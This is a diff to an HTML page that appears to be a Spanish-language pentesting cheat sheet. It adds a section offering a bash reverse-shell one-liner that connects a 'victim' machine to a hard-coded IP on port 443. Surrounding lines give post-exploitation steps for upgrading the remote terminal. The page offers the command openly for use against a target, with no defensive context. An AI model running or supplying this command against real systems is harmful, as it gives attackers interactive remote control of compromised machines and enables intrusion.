@@ -32,8 +32,14 @@
 		</header>
 			<ul id="comandos">
 				<!--Linux-->
-				<button onclick="leerMasLinux()" id="leerMasLinux">Linux</button>
+				<button onclick="leerMasLinux()" id="leerMasLinux" class="block">Linux</button>
 				<div class="linux" id="linux" style="display: none;">
+					<!--Revershell-->
+					<p>Comando para crear una revershell con la víctima</p>
+					<p id="ejemplo">#!/bin/bash 
+					</br>bash -i >& /dev/tcp/10.10.21.42/443 0>&1</p>
+
+					<!--Tratamiendo de la terminal-->
 					<p>Tratamiento de la terminal en linux (Post-explotación)</p>
 					<p>(En la terminal remota) > script /dev/null -c bash</p>
 					<p>ctrl z</p>
